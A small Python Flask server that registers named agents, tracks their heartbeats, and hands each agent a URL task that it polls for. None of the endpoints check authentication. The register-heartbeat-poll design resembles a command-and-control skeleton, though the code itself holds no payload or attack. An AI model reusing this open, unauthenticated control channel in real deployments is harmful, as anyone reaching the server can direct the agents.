from flask import Flask, request, jsonify, render_template
import time

app = Flask(__name__, template_folder="templates")
agents = {}
tasks = {}

@app.route("/")
def index():
    return render_template("agents.html", agents=agents)

@app.route("/register", methods=["POST"])
def register():
    name = request.json["name"]
    agents[name] = {"status": "online", "last_seen": time.time()}
    return "ok"

@app.route("/heartbeat", methods=["POST"])
def heartbeat():
    name = request.json["name"]
    if name in agents:
        agents[name]["last_seen"] = time.time()
    return "ok"

@app.route("/task/<name>")
def task(name):
    return jsonify(tasks.get(name, {}))

@app.route("/assign", methods=["POST"])
def assign():
    data = request.json
    name = data["name"]
    url = data["url"]
    tasks[name] = {"url": url}
    return "assigned"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)